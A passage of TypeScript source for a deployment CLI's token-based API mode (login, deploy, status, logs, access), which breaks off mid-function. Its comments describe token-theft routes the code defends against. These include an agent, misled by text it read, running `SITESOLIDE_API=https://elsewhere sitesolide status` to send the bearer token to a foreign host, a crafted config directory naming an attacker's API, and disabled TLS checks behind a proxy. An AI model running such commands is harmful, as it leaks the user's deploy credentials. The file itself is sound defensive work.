/**
 * The CLI without root SSH: a team member, or an agent in a sandbox, deploys
 * with a personal token over HTTPS, through the dashboard's control API.
 *
 *   sitesolide login --url https://dashboard.example.com
 *   sitesolide deploy      build here, upload, follow the machine's log
 *   sitesolide status      the projects this token may deploy
 *   sitesolide logs [--follow]
 *   sitesolide share [<email>...]   who may open the project, see sharing.ts
 *
 * **Which mode a command runs in.** A configuration with a `server` is the
 * owner's, and runs over SSH exactly as before: nothing here touches that path.
 * A configuration without one, but with the dashboard's address and a token,
 * is a team member's, and runs here. `--api` makes the owner use the API too,
 * to see what a team member sees.
 *
 * **The token is never in the configuration.** It lives in the workstation's
 * vault, `~/.config/sitesolide/secrets/team-token`, 0600, beside the other
 * credentials the workstation presents; `SITESOLIDE_TOKEN` in the environment
 * wins over it, for a sandbox that has no files to keep. The dashboard's
 * address is in config.json, under `api`, or in `SITESOLIDE_API`; the one the
 * vault's token was checked against is beside it, `team-token-api`, and the
 * vault's token goes nowhere else (boundAddress).
 *
 * **The token only ever goes to that address.** The archive is sent to
 * `<api>/api/v1/deployments/<id>/bundle`, built here, and never to an address
 * an answer names: a compromised or mistaken answer would otherwise receive
 * the bearer.
 *
 * The build stays on the workstation, as over SSH: the archive carries its
 * result, the code minus its exclusions in `app/`, and the public files in
 * `public/`. The machine installs dependencies itself, as the project's account.
 *
 * **An option this path does not carry is refused, never passed over.**
 * `deploy --dry-run` used to deploy for real here, and `--json` to print plain
 * text, so that the MCP tool's dry run replaced the live site and then
 * reported a failure inviting a retry. Both now behave as over SSH: `--json`
 * prints the same events and one final `result` or `error`, and a dry run is
 * refused, saying why, until the control API can judge without deploying.
 */
import { chmodSync, closeSync, constants, existsSync, fstatSync, lstatSync, mkdirSync, openSync, readdirSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { bundle, excludedBy, type BundleEntry } from "./bundle";
import { configPath, defaultPaths, expandHome, projectsRepo, readConfigFile } from "./config";
import { hintForFailure } from "./hints";
import { hasServices, isApp, mainPort, missingExclusions, NEVER_SENT, parserComplaint, readManifest, servicesOf, type Manifest } from "./manifest";
import { eventFor, formatEvent, runsOf, type OutputEvent } from "./output";
import { share, SHARE_OPTIONS, type AccessState, type AccessTransport, type EntryAnswer, type Reading } from "./access";
import { sourceRefusal } from "./source";

/** Where the token is kept in the vault. */
export const TOKEN_FILE = "team-token";

/**
 * Beside it, the dashboard `login` checked it against, the only address it
 * goes to: see boundAddress.
 */
export const TOKEN_ADDRESS_FILE = "team-token-api";

/** The limits the dashboard applies, checked here first so that a refusal comes before the upload. */
export const LIMITS = { bundleBytes: 100 * 1024 * 1024, extractedBytes: 512 * 1024 * 1024, entries: 20_000 };

export type Remote = { api: string; token: string };

type Environment = Record<string, string | undefined>;

/** The raw configuration file, the `api` key included, which `Config` does not carry. */
function rawConfig(home: string, environment: Environment): Record<string, unknown> {
  const path = configPath(home, environment);
  if (!existsSync(path)) return {};
  try {
    const parsed = JSON.parse(readFileSync(path, "utf8")) as unknown;
    return typeof parsed === "object" && parsed !== null && !Array.isArray(parsed) ? (parsed as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

/** The vault's folder, as the SSH path computes it: environment, file, default. */
export function vaultFolder(environment: Environment, home: string): string {
  const file = readConfigFile(home, environment);
  return expandHome(environment.SITESOLIDE_VAULT ?? file.vault ?? defaultPaths(home, environment).vault, home);
}

export function tokenPath(environment: Environment, home: string): string {
  return join(vaultFolder(environment, home), TOKEN_FILE);
}

/**
 * The dashboard's address, as an origin: https, or http on the loopback for a
 * local bench. null when it is not one.
 */
export function apiOrigin(raw: string): string | null {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return null;
  }
  const local = url.hostname === "localhost" || url.hostname === "127.0.0.1" || url.hostname === "[::1]";
  if (url.protocol !== "https:" && !(url.protocol === "http:" && local)) return null;
  if (url.username !== "" || url.password !== "") return null;
  return url.origin;
}

/**
 * Does this command run through the API? `--api` says so; otherwise a
 * configuration with a server is the owner's, and one with an API address and
 * no server is a team member's.
 */
export function remoteMode(arguments_: string[], environment: Environment, home = homedir()): boolean {
  if (arguments_.includes("--api")) return true;
  const file = rawConfig(home, environment);
  const server = environment.SITESOLIDE_SERVER ?? (typeof file.server === "string" ? file.server : "");
  if (server !== "") return false;
  const api = environment.SITESOLIDE_API ?? (typeof file.api === "string" ? file.api : "");
  return api !== "";
}

/** The address and the token, or what is missing, said with the command that fixes it. */
export function readRemote(environment: Environment, home = homedir()): Remote | { missing: string } {
  const file = rawConfig(home, environment);
  const raw = environment.SITESOLIDE_API ?? (typeof file.api === "string" ? file.api : "");
  const api = raw === "" ? null : apiOrigin(raw);
  if (api === null) {
    return { missing: raw === "" ? "no dashboard address: run sitesolide login --url https://dashboard.<zone>" : `not an https address: ${raw}` };
  }
  let token = environment.SITESOLIDE_TOKEN ?? "";
  if (token === "") {
    const vault = vaultFolder(environment, home);
    const path = join(vault, TOKEN_FILE);
    const kept = readVaultFile(path);
    if (kept.kind === "absent") return { missing: `no token in ${path}: run sitesolide login, or set SITESOLIDE_TOKEN` };
    if (kept.kind === "refused") return { missing: `${path} is a link or has another name: run sitesolide login, which writes the token there itself` };
    // The vault's token goes to the dashboard `login` checked it against,
    // and to no other: `SITESOLIDE_API=https://elsewhere sitesolide status`,
    // typed by an agent that read it somewhere, sent the bearer there, out of
    // a vault the agent itself may not read. A sandbox aims elsewhere with a
    // token of its own, SITESOLIDE_TOKEN beside it.
    const bound = boundAddress(vault);
    if (bound !== api) {
      const named = environment.SITESOLIDE_API !== undefined ? "SITESOLIDE_API" : "config.json";
      return { missing: `${named} names ${api}, not ${bound ?? "the address login wrote"}, the dashboard the token in the vault was checked against: run sitesolide login --url ${api}, or set SITESOLIDE_TOKEN beside it` };
    }
    token = kept.text.trim();
  }
  if (!/^sst_[A-Za-z0-9_-]{43}$/.test(token)) return { missing: "the token does not have the shape sst_...: ask the owner of the machine for a new one" };
  return { api, token };
}

/**
 * The one address the vault's token may go to, or null when none can be
 * trusted. Never the configuration the environment chooses: config.json is
 * no secret, an agent that may not read the vault may still write it or run
 * `sitesolide init --api`, and the environment picks which config.json is
 * read at all. `SITESOLIDE_CONFIG_DIR=/tmp/x`, or another `HOME`, with a
 * config.json there naming an attacker's `api` and the real vault, by its
 * `vault` key or SITESOLIDE_VAULT, made that `api` the one the real token
 * was compared with, and sent it there.
 *
 * The address `login` wrote in the vault beside the token, first: the vault
 * is the one folder the agent can neither read nor write.
 *
 * A vault `login` filled before it wrote the address holds none. Its token
 * goes where it always did, the `api` of the config.json `login` wrote then,
 * beside the vault's real folder, `secrets/`, whatever the environment
 * names: a vault elsewhere, with no configuration beside it, holds nothing
 * that says where its token was checked, and the answer is `sitesolide
 * login` again, which writes the address.
 */
function boundAddress(vault: string): string | null {
  const recorded = readVaultFile(join(vault, TOKEN_ADDRESS_FILE));
  if (recorded.kind === "present") return apiOrigin(recorded.text);
  if (recorded.kind === "refused") return null;
  try {
    const parsed = JSON.parse(readFileSync(join(dirname(realpathSync(vault)), "config.json"), "utf8")) as { api?: unknown } | null;
    return typeof parsed?.api === "string" ? apiOrigin(parsed.api) : null;
  } catch {
    return null;
  }
}

type VaultRead = { kind: "absent" } | { kind: "refused" } | { kind: "present"; text: string };

/**
 * A file the vault's token depends on, read only when it is a plain file with
 * a single name, judged on the descriptor that reads it. A vault folder the
 * environment names is anyone's to fill: a link there, or a second name
 * given to the real token, put that token in a vault whose address someone
 * else wrote.
 */
function readVaultFile(path: string): VaultRead {
  let fd: number;
  try {
    fd = openSync(path, constants.O_RDONLY | constants.O_NOFOLLOW | constants.O_NONBLOCK);
  } catch (error) {
    return (error as NodeJS.ErrnoException).code === "ENOENT" ? { kind: "absent" } : { kind: "refused" };
  }
  try {
    const info = fstatSync(fd);
    if (!info.isFile() || info.nlink !== 1 || info.size > 64 * 1024) return { kind: "refused" };
    return { kind: "present", text: readFileSync(fd, "utf8") };
  } finally {
    closeSync(fd);
  }
}

// --- talking to the API ------------------------------------------------------------

export type Failure = { error: string; message: string; details?: string[]; wait?: number };
export type Answer<T> = { ok: true; status: number; body: T } | { ok: false; status: number; failure: Failure };

export type Fetch = (input: string, init?: BunFetchRequestInit) => Promise<Response>;

/** One call: the bearer, JSON back, every failure said in the API's own words. */
export async function call<T>(remote: Remote, path: string, init: RequestInit = {}, fetcher: Fetch = fetch): Promise<Answer<T>> {
  let response: Response;
  try {
    response = await fetcher(`${remote.api}${path}`, {
      ...init,
      redirect: "error",
      headers: { Authorization: `Bearer ${remote.token}`, ...(init.headers ?? {}) },
      // The certificate is checked whatever the environment says: Bun's
      // fetch obeys NODE_TLS_REJECT_UNAUTHORIZED=0, and HTTPS_PROXY beside it
      // let the proxy answer the handshake itself and read the bearer.
      tls: { rejectUnauthorized: true },
    });
  } catch (error) {
    return { ok: false, status: 0, failure: { error: "unreachable", message: `${remote.api} unreachable: ${(error as Error).message}` } };
  }
  let body: unknown;
  try {
    body = await response.json();
  } catch {
    return { ok: false, status: response.status, failure: { error: "unreadable", message: `${remote.api} answered ${response.status} with something that is not the control API` } };
  }
  if (response.ok) return { ok: true, status: response.status, body: body as T };
  const failure = body as Partial<Failure>;
  return {
    ok: false,
    status: response.status,
    failure: {
      error: typeof failure.error === "string" ? failure.error : "failure",
      message: typeof failure.message === "string" ? failure.message : `${remote.api} answered ${response.status}`,
      ...(Array.isArray(failure.details) ? { details: failure.details.map(String) } : {}),
      ...(typeof failure.wait === "number" ? { wait: failure.wait } : {}),
    },
  };
}

/**
 * What the commands print, for a person or, under `--json`, for a program, as
 * bin/sitesolide.ts does over SSH: see bin/cli/output.ts.
 *
 * `say` is a line of the run, `journal` a line of a service's journal.
 * `failed` and `succeeded` end the run, and are what `--json` is for: exactly
 * one `error`, with its hint, or one `result`, with what the run concluded,
 * always the last line. Without them an agent read the plain console text,
 * and a deploy that went wrong looked like one that said nothing.
 */
export type Output = {
  say: (line: string) => void;
  journal: (line: string) => void;
  /** `said`: a person already read the message, in the machine's log. */
  failed: (failure: Failure, said?: boolean) => void;
  succeeded: (command: string, fields: Record<string, unknown>) => void;
};

export const humanOutput: Output = {
  say: (line) => console.log(line),
  journal: (line) => console.log(line),
  failed: (failure, said = false) => {
    if (said) return;
    console.error(`!! ${failure.message}`);
    for (const detail of failure.details ?? []) console.error(`   ${detail}`);
    if (failure.wait !== undefined) console.error(`   wait ${failure.wait} s`);
  },
  succeeded: () => {},
};

/** The events of `--json`, one per line on standard output, and nothing else. */
export function eventOutput(write: (line: string) => void = (line) => console.log(line)): Output {
  const emit = (event: OutputEvent): void => write(formatEvent(event));
  return {
    say: (line) => {
      const event = eventFor(line);
      if (event !== null) emit(event);
    },
    journal: (line) => emit({ type: "log", at: null, unit: null, priority: null, message: line }),
    failed: (failure) =>
      emit({
        type: "error",
        message: failure.message,
        details: [...(failure.details ?? []), ...(failure.wait === undefined ? [] : [`wait ${failure.wait} s`])],
        hint: hintForFailure(failure.error, failure.message),
      }),
    succeeded: (command, fields) => emit({ type: "result", ok: true, command, ...fields }),
  };
}

function report(output: Output, failure: Failure): number {
  output.failed(failure);
  return 1;
}

// --- the project, read for the API ------------------------------------------------

export type RemoteProject = { folder: string; code: string; manifest: Manifest; raw: string };

/**
 * The manifest as the API will judge it: `validate()` of the CLI, except that
 * a missing port is not an error, the machine choosing one. Missing ports are
 * filled with stand-ins for the check alone; the text sent is the file's.
 *
 * Only a public service gets one. An internal service without a port is a
 * worker, which listens on nothing, and a scheduled one may not have a port
 * at all: a stand-in would make the first a server and the second refused.
 */
export function checkManifest(raw: string): { manifest?: Manifest; errors: string[] } {
  let object: unknown;
  try {
    object = JSON.parse(raw);
  } catch (error) {
    return { errors: [`sitesolide.json is unreadable: ${parserComplaint(error)}`] };
  }
  if (typeof object !== "object" || object === null || Array.isArray(object)) return { errors: ["sitesolide.json must contain an object"] };
  const filled: Record<string, unknown> = { ...(object as Record<string, unknown>) };
  if (typeof filled.services === "object" && filled.services !== null && !Array.isArray(filled.services)) {
    const services: Record<string, unknown> = {};
    let next = 3000;
    for (const [name, service] of Object.entries(filled.services as Record<string, unknown>)) {
      const standIn =
        typeof service === "object" && service !== null && !Array.isArray(service) && !("port" in service) && !("schedule" in service) && (service as { internal?: unknown }).internal !== true;
      services[name] = standIn ? { ...service, port: next++ } : service;
    }
    filled.services = services;
  } else if (typeof filled.start === "string" && !("port" in filled)) {
    filled.port = 3000;
  }
  const { errors } = readManifest(JSON.stringify(filled));
  return errors.length > 0 ? { errors } : { manifest: object as Manifest, errors: [] };
}

export function readRemoteProject(folder: string): RemoteProject | { errors: string[] } {
  const path = join(folder, "sitesolide.json");
  if (!existsSync(path)) return { errors: [`sitesolide.json not found in ${folder}`] };
  const raw = readFileSync(path, "utf8");
  const { manifest, errors } = checkManifest(raw);
  if (manifest === undefined || errors.length > 0) return { errors: ["sitesolide.json rejected", ...errors] };
  const code = manifest.source === undefined ? folder : resolve(folder, manifest.source);
  if (!existsSync(code) || !lstatSync(code).isDirectory()) return { errors: [`source not found: ${manifest.source} (${code})`] };
  // As over SSH: outside the sites repository, source stays inside its own, see source.ts.
  let sitesRepo: string | null = null;
  try {
    sitesRepo = projectsRepo();
  } catch {
    sitesRepo = null;
  }
  const escape = manifest.source === undefined ? null : sourceRefusal(folder, code, sitesRepo);
  if (escape !== null) return { errors: [escape, "a manifest outside your sites repository may only point inside its own repository: nothing was built nor sent"] };
  const missing = isApp(manifest) ? missingExclusions(manifest, readdirSync(code)) : [];
  if (missing.length > 0) {
    return { errors: [`exclude: ${missing.join(", ")} present on disk and not excluded`, `add "exclude": [${missing.map((name) => `"${name}"`).join(", ")}] to the manifest`] };
  }
  return { folder, code, manifest, raw };
}

/**
 * The entries of one tree, `prefix/...`, without what the patterns exclude.
 * A link or a special file is refused: the machine refuses them, and saying so
 * here names the file.
 */
export function collect(root: string, prefix: string, patterns: readonly string[]): { entries: BundleEntry[]; refused: string[] } {
  const entries: BundleEntry[] = [];
  const refused: string[] = [];
  const visit = (folder: string, relative: string) => {
    for (const name of readdirSync(folder).sort()) {
      const path = join(folder, name);
      const inner = relative === "" ? name : `${relative}/${name}`;
      const stat = lstatSync(path);
      if (excludedBy(inner, stat.isDirectory(), patterns)) continue;
      const mtime = Math.floor(stat.mtimeMs / 1000);
      if (stat.isSymbolicLink()) refused.push(`${prefix}/${inner} is a symbolic link`);
      else if (stat.isDirectory()) {
        entries.push({ kind: "directory", path: `${prefix}/${inner}`, mtime });
        visit(path, inner);
      } else if (stat.isFile()) {
        entries.push({ kind: "file", path: `${prefix}/${inner}`, mtime, executable: (stat.mode & 0o111) !== 0, content: readFileSync(path) });
      } else refused.push(`${prefix}/${inner} is not a regular file`);
    }
  };
  entries.push({ kind: "directory", path: prefix, mtime: Math.floor(lstatSync(root).mtimeMs / 1000) });
  visit(root, "");
  return { entries, refused };
}

/**
 * What leaves, as rsync would have sent it: the code into `app/`, minus its
 * exclusions, the manifest and the public files; the public files into
 * `public/`. Neither tree carries `.git` nor a `.env`, at any depth: see
 * NEVER_SENT.
 */
export function projectEntries(project: RemoteProject): { entries: BundleEntry[]; refused: string[] } {
  const { manifest } = project;
  const entries: BundleEntry[] = [];
  const refused: string[] = [];
  if (isApp(manifest)) {
    const patterns = [...(manifest.exclude ?? []), ...NEVER_SENT, "sitesolide.json", ...(manifest.publicDir === undefined ? [] : [manifest.publicDir])];
    const app = collect(project.code, "app", patterns);
    entries.push(...app.entries);
    refused.push(...app.refused);
  }
  if (manifest.publicDir !== undefined) {
    const files = collect(join(project.code, manifest.publicDir), "public", NEVER_SENT);
    entries.push(...files.entries);
    refused.push(...files.refused);
  }
  return { entries, refused };
}

// --- the commands -------------------------------------------------------------------

export type RemoteDependencies = {
  folder: string;
  environment: Environment;
  home?: string;
  fetcher?: Fetch;
  output?: Output;
  /** The build of bin/sitesolide.ts, which runs the manifest's `build` here. */
  build: (project: RemoteProject) => Promise<void>;
  /** Its check that the public folder exists and is not empty. */
  checkPublic: (project: RemoteProject) => void;
  /** Between two reads of a deployment's progress. */
  pause?: () => Promise<void>;
  prompt?: (question: string) => string | null;
  stdin?: () => Promise<string>;
  /** A secret's value typed without echo, null when the typing was abandoned, a refusal for a key it does not take: `promptWithoutEcho` by default. */
  secretPrompt?: (question: string) => Promise<Typed>;
  /** Whether standard input is a terminal, where a person types and `--stdin` would echo: its `isTTY` by default. */
  terminal?: () => boolean;
};

type DeploymentView = {
  id: string;
  slug: string;
  state: string;
  creating: boolean;
  log: string[];
  next: number;
  error: { code: string; message: string } | null;
  url: string | null;
  allocated: { service: string | null; port: number }[];
};

/** `member`: the dashboard's member whose own token it is, narrowed to their roles; absent from a dashboard before them. */
type Identity = {
  id: string;
  label: string;
  email: string;
  expiresAt: number | null;
  /** `secrets`: absent from a dashboard before the permission, which reads as without it. */
  scope: { slugs: string[]; create: boolean; outbound: boolean; domain: boolean; public: boolean; secrets?: boolean };
  owned: string[];
  member?: string | null;
};

/** The token held, said in one line: who, and what it may do. */
export function describeIdentity(identity: Identity): string[] {
  const may = [
    identity.scope.create ? "create projects" : null,
    // A member's token deploys its projects behind the door they have, and opens none without the option.
    identity.scope.public ? "deploy public sites" : typeof identity.member === "string" ? "open no site to the public" : "deploy private sites only",
    identity.scope.outbound ? "use network: outbound" : null,
    identity.scope.domain ? "declare a domain" : null,
    identity.scope.secrets === true ? "manage secrets" : null,
  ].filter((part): part is string => part !== null);
  const projects = [...new Set([...identity.owned, ...identity.scope.slugs])].sort();
  return [
    `   ${identity.email} (${identity.label}), token ${identity.id}`,
    `   may ${may.join(", ")}`,
    `   projects: ${projects.length === 0 ? "none yet" : projects.join(", ")}`,
    ...(identity.expiresAt === null ? [] : [`   expires ${new Date(identity.expiresAt).toISOString().slice(0, 10)}`]),
    ...(typeof identity.member === "string" ? [`   a personal token: never more than ${identity.member}'s roles on the dashboard, read at every request`] : []),
  ];
}

export async function login(arguments_: string[], dependencies: Omit<RemoteDependencies, "build" | "checkPublic" | "folder">): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const home = dependencies.home ?? homedir();
  const environment = dependencies.environment;
  const refused = unknownOptions("login", arguments_);
  if (refused !== null) return report(output, refused);
  // Under --json nothing prompts: the question would land on standard output
  // among the events, and the answer never come from an agent's empty stdin.
  const interactive = !arguments_.includes("--json");
  const ask = (question: string): string => (interactive ? ((dependencies.prompt ?? prompt)(question) ?? "") : "");
  const value = (name: string) => {
    const marker = arguments_.indexOf(`--${name}`);
    return marker === -1 ? undefined : arguments_[marker + 1];
  };
  const raw = value("url") ?? environment.SITESOLIDE_API ?? ask("Dashboard address, https://dashboard.<zone>:");
  const api = apiOrigin(raw);
  if (api === null) return report(output, { error: "invalid", message: `not an https address: ${raw || "nothing given"}` });

  let token = environment.SITESOLIDE_TOKEN ?? "";
  if (arguments_.includes("--token-stdin")) token = (await (dependencies.stdin ?? (() => Bun.stdin.text()))()).trim();
  if (token === "" && interactive && (dependencies.terminal ?? (() => process.stdin.isTTY === true))()) {
    // At a terminal, without echo, as `secrets set` reads a value: the
    // token typed at `prompt` stayed on the screen and in the scrollback,
    // a credential that deploys and sets secrets, shown to whoever looks.
    const typed = await (dependencies.secretPrompt ?? promptWithoutEcho)("Token, sst_..., as the owner of the machine gave it (no echo): ");
    if (typed === null) return report(output, { error: "cancelled", message: "nothing typed: nothing was written" });
    if (typeof typed !== "string") return report(output, { error: "invalid", message: `${typed.refused}: nothing was written` });
    token = typed.trim();
  }
  if (token === "") token = ask("Token, sst_..., as the owner of the machine gave it:").trim();
  if (!/^sst_[A-Za-z0-9_-]{43}$/.test(token)) return report(output, { error: "invalid", message: "this is not a sitesolide token: it starts with sst_ and is 47 characters long" });

  const remote = { api, token };
  const answer = await call<{ identity: Identity }>(remote, "/api/v1/whoami", {}, dependencies.fetcher);
  if (!answer.ok) return report(output, answer.failure);

  const vault = vaultFolder(environment, home);
  mkdirSync(vault, { recursive: true, mode: 0o700 });
  const path = join(vault, TOKEN_FILE);
  writeFileSync(path, `${token}\n`, { mode: 0o600 });
  chmodSync(path, 0o600);
  // The address the token was just checked against, beside it in the vault,
  // and the only one readRemote sends it to: see boundAddress.
  const address = join(vault, TOKEN_ADDRESS_FILE);
  writeFileSync(address, `${api}\n`, { mode: 0o600 });
  chmodSync(address, 0o600);
  const file = rawConfig(home, environment);
  mkdirSync(dirname(configPath(home, environment)), { recursive: true });
  writeFileSync(configPath(home, environment), `${JSON.stringify({ ...file, api }, null, 2)}\n`);

  output.say(`-> signed in to ${api}`);
  for (const line of describeIdentity(answer.body.identity)) output.say(line);
  output.say(`   token kept in ${path}, address in ${configPath(home, environment)}`);
  if (typeof file.server === "string" && file.server !== "") output.say("   this workstation also has a server: commands use SSH unless given --api");
  output.succeeded("login", { api, identity: answer.body.identity, tokenFile: path });
  return 0;
}

async function deploy(remote: Remote, dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const read = readRemoteProject(dependencies.folder);
  if ("errors" in read) {
    const [first, ...rest] = read.errors;
    return report(output, { error: "invalid", message: first ?? "sitesolide.json rejected", details: rest });
  }
  const project = read;
  output.say(`-> project ${project.manifest.slug}, through ${remote.api}`);

  // The manifest first: the dashboard and the steward judge it, so that a
  // refusal comes back before the build and the upload.
  const created = await call<{ deployment: DeploymentView }>(
    remote,
    "/api/v1/deployments",
    { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ manifest: project.raw }) },
    dependencies.fetcher,
  );
  if (!created.ok) return report(output, created.failure);
  const deployment = created.body.deployment;
  output.say(`   deployment ${deployment.id}${deployment.creating ? ", a new project" : ""}`);

  await dependencies.build(project);
  dependencies.checkPublic(project);

  output.say("-> archive");
  const { entries, refused } = projectEntries(project);
  if (refused.length > 0) {
    return report(output, { error: "invalid", message: "the machine refuses links and special files in the archive", details: [...refused.slice(0, 10), "replace them with the files they point to, or exclude them in sitesolide.json"] });
  }
  const files = entries.filter((entry) => entry.kind === "file");
  const bytes = files.reduce((sum, entry) => sum + (entry.kind === "file" ? entry.content.length : 0), 0);
  if (entries.length > LIMITS.entries || bytes > LIMITS.extractedBytes) {
    return report(output, { error: "too-large", message: `${entries.length} entries, ${bytes} bytes: over what the machine accepts (${LIMITS.entries} entries, 512 MiB)`, details: ["exclude dependencies and caches in sitesolide.json: the machine installs dependencies itself"] });
  }
  const archive = bundle(entries);
  if (archive.length > LIMITS.bundleBytes) return report(output, { error: "too-large", message: `the archive is ${archive.length} bytes compressed, over 100 MiB` });
  output.say(`   ${files.length} file(s), ${bytes} bytes, ${archive.length} compressed`);

  output.say("-> upload");
  const uploaded = await call<{ deployment: DeploymentView }>(
    remote,
    `/api/v1/deployments/${deployment.id}/bundle`,
    { method: "PUT", headers: { "Content-Type": "application/gzip" }, body: archive },
    dependencies.fetcher,
  );
  if (!uploaded.ok) return report(output, uploaded.failure);

  // The machine's log, as it is written, until the end.
  let next = 0;
  const pause = dependencies.pause ?? (() => Bun.sleep(1000));
  for (;;) {
    const read = await call<{ deployment: DeploymentView }>(remote, `/api/v1/deployments/${deployment.id}?after=${next}`, {}, dependencies.fetcher);
    if (!read.ok) {
      if (read.failure.error === "unreachable") {
        await pause();
        continue;
      }
      return report(output, read.failure);
    }
    const view = read.body.deployment;
    for (const line of view.log) output.say(line);
    next = view.next;
    if (view.state === "succeeded") {
      for (const { service, port } of view.allocated) {
        output.say(`   the machine chose port ${port}${service === null ? "" : ` for ${service}`}: write it in sitesolide.json to keep it explicit`);
      }
      const main = view.allocated.find((entry) => entry.service === null) ?? view.allocated[0];
      output.succeeded("deploy", {
        slug: project.manifest.slug,
        kind: isApp(project.manifest) ? (hasServices(project.manifest) ? "services" : "service") : "static",
        ...(isApp(project.manifest) ? { runs: runsOf(servicesOf(project.manifest)) } : {}),
        dryRun: false,
        port: main?.port ?? mainPort(project.manifest),
        ...(view.allocated.length > 0 ? { portChosen: "free" } : {}),
        manifestWritten: false,
        url: view.url,
        deployment: deployment.id,
        creating: deployment.creating,
      });
      return 0;
    }
    if (view.state === "failed" || view.state === "expired") {
      const error = view.error ?? { code: view.state === "expired" ? "expired" : "failure", message: `the deployment ended ${view.state}` };
      // A person already read the message in the machine's log; an agent
      // still gets it as the final event, with its hint.
      output.failed({ error: error.code, message: error.message }, view.log.some((line) => line.includes(error.message)));
      return 1;
    }
    await pause();
  }
}

/** One service of a project, as the control API reports it. */
type ServiceState = {
  name: string | null;
  state: string;
  subState: string;
  port: number | null;
  /** Absent from a dashboard from before workers and scheduled services: every service was a server then. */
  kind?: "server" | "worker" | "scheduled";
};

type ProjectStatus = {
  slug: string;
  access: string;
  deployed: boolean;
  type: string | null;
  url: string | null;
  /** Absent from a dashboard from before it: read from `portal` then. */
  general?: "public" | "restricted" | "code" | null;
  portal: { wanted: boolean; installed: boolean } | null;
  services: ServiceState[];
};

/**
 * The SERVICE column of a project: `active` when everything that should run
 * does, the states that differ otherwise. A scheduled service is inactive
 * between two runs and active during one, neither of which says anything is
 * wrong: only a failed run counts. A project whose every service is
 * scheduled, none failed, reads `scheduled`.
 */
export function serviceWord(services: readonly ServiceState[]): string {
  if (services.length === 0) return "-";
  const counted = services.filter((service) => service.kind !== "scheduled" || service.state === "failed");
  if (counted.length === 0) return "scheduled";
  return counted.every((service) => service.state === "active") ? "active" : counted.map((service) => service.state).join(",");
}

/** Who may open the site, in the words of the dashboard's Access section. */
export function generalWord(project: Pick<ProjectStatus, "general" | "portal" | "deployed">): string {
  const general = project.general !== undefined ? project.general : project.portal === null ? null : project.portal.installed ? "restricted" : "public";
  if (!project.deployed || general === null) return "-";
  return { public: "Public", restricted: "Restricted", code: "Anyone with the code" }[general];
}

async function status(remote: Remote, dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const who = await call<{ identity: Identity }>(remote, "/api/v1/whoami", {}, dependencies.fetcher);
  if (!who.ok) return report(output, who.failure);
  output.say(`=== ${remote.api}`);
  for (const line of describeIdentity(who.body.identity)) output.say(line);
  const answer = await call<{ projects: ProjectStatus[] }>(remote, "/api/v1/projects", {}, dependencies.fetcher);
  if (!answer.ok) return report(output, answer.failure);
  output.say("");
  output.say(`${"PROJECT".padEnd(22)} ${"TYPE".padEnd(7)} ${"SERVICE".padEnd(10)} ${"GENERAL ACCESS".padEnd(21)} ADDRESS`);
  for (const project of answer.body.projects) {
    const service = serviceWord(project.services);
    output.say(`${project.slug.padEnd(22)} ${(project.type ?? (project.deployed ? "?" : "-")).padEnd(7)} ${service.padEnd(10)} ${generalWord(project).padEnd(21)} ${project.url ?? "not deployed"}`);
  }
  output.succeeded("status", { api: remote.api, identity: who.body.identity, projects: answer.body.projects });
  return 0;
}

async function logs(remote: Remote, dependencies: RemoteDependencies, follow: boolean, lines: number): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const path = join(dependencies.folder, "sitesolide.json");
  if (!existsSync(path)) return report(output, { error: "invalid", message: `sitesolide.json not found in ${dependencies.folder}: run this from the project's folder` });
  const { manifest } = checkManifest(readFileSync(path, "utf8"));
  if (manifest === undefined) return report(output, { error: "invalid", message: "sitesolide.json rejected" });
  let cursor: string | null = null;
  let entries = 0;
  const pause = dependencies.pause ?? (() => Bun.sleep(2000));
  for (;;) {
    const parameters: Record<string, string> = cursor === null ? { lines: String(lines) } : { lines: "500", cursor };
    const query = new URLSearchParams(parameters);
    const answer: Answer<{ lines: string[]; cursor: string | null }> = await call(remote, `/api/v1/projects/${encodeURIComponent(manifest.slug)}/logs?${query}`, {}, dependencies.fetcher);
    if (!answer.ok) return report(output, answer.failure);
    for (const line of answer.body.lines) output.journal(line);
    entries += answer.body.lines.length;
    cursor = answer.body.cursor;
    if (!follow) {
      output.succeeded("logs", { slug: manifest.slug, entries, cursor });
      return 0;
    }
    await pause();
  }
}

/**
 * A dashboard from before a route answers it from its catch-all, `not-found`
 * "no such route": said as what it is, a machine that does not carry it yet,
 * rather than a project the token cannot see.
 */
function predatesRoute(answer: Answer<unknown>): boolean {
  return !answer.ok && answer.failure.error === "not-found" && answer.failure.message.startsWith("no such route");
}

/**
 * Access through the control API: the steward judges the token and the
 * access rules, a token giving Can open alone.
 */
export function apiAccess(remote: Remote, fetcher?: Fetch): AccessTransport {
  const path = (slug: string) => `/api/v1/projects/${encodeURIComponent(slug)}/access`;
  const outdated = (answer: Answer<unknown>): Reading<never> | null =>
    predatesRoute(answer)
      ? { ok: false, failure: { error: "not-available", message: `the dashboard at ${remote.api} does not carry access yet: the owner of the machine runs sitesolide upgrade` } }
      : null;
  const change = async (slug: string, method: "PUT" | "DELETE", body: object): Promise<Reading<EntryAnswer>> => {
    const answer: Answer<EntryAnswer> = await call(remote, path(slug), { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }, fetcher);
    const old = outdated(answer);
    if (old !== null) return old;
    if (!answer.ok) return { ok: false, failure: answer.failure };
    if (typeof answer.body !== "object" || answer.body === null || typeof answer.body.change !== "string") {
      return { ok: false, failure: { error: "unreadable", message: `${remote.api} answered with something that is not the control API's access` } };
    }
    return { ok: true, value: answer.body };
  };
  return {
    via: `through ${remote.api}`,
    owner: false,
    // A token gives Can open alone: the line to send names the site, not the dashboard.
    dashboard: null,
    async list(slug) {
      const answer: Answer<{ access: AccessState }> = await call(remote, path(slug), {}, fetcher);
      const old = outdated(answer);
      if (old !== null) return old;
      if (!answer.ok) return { ok: false, failure: answer.failure };
      const state = answer.body.access;
      if (typeof state !== "object" || state === null || typeof state.url !== "string" || !Array.isArray(state.entries)) {
        return { ok: false, failure: { error: "unreadable", message: `${remote.api} answered with something that is not the control API's access` } };
      }
      return { ok: true, value: state };
    },
